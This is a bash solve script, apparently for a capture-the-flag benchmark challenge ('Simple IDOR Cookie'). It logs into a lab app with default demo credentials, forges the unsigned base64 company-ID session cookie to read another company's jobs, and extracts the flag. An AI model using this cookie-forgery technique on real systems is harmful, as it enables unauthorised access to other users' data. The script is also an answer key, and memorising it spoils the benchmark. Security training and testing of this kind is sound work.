#!/usr/bin/env bash
# XBEN-021-24 — "Simple IDOR Cookie" (tags: idor, default_credentials)
#
# The session cookie is `Bearer base64(company_id)`: no signature, no secret,
# nothing to forge around. Log in as the demo company, then ask for another
# company's jobs with that company's number in the cookie. The admin company's
# jobs include a private one holding the flag.
#
# Two h5i pieces matter here. The stored request already carries the shape of a
# logged-in request, so only the identity has to change; and `cookie.<name>`
# edits one cookie inside the header rather than replacing the whole `Cookie`
# line, which is what keeps every other cookie the session holds intact.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben021-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# 1. Log in as the seeded demo account.
"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "#username" "demo" --session "$SESSION" >/dev/null
"$H5I" browser type --selector "#password" "demo" --session "$SESSION" >/dev/null
"$H5I" browser click --role button --name "Login" --session "$SESSION" >/dev/null

# 2. The login lands on this company's own jobs page. That request is the one
#    to bend: it is authenticated, and its identity is entirely in the cookie.
SEQ="$("$H5I" websec requests --url-contains /jobs --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["requests"][0]["seq"])')"

# 3. Ask for company 2 as company 2. `2` in base64 is the whole forgery.
TOKEN="Bearer $(printf '2' | base64)"
REPLAY="$("$H5I" websec replay "req_$SEQ" \
    --set 'path=/company/2/jobs' \
    --set "cookie.access_token=$TOKEN" \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
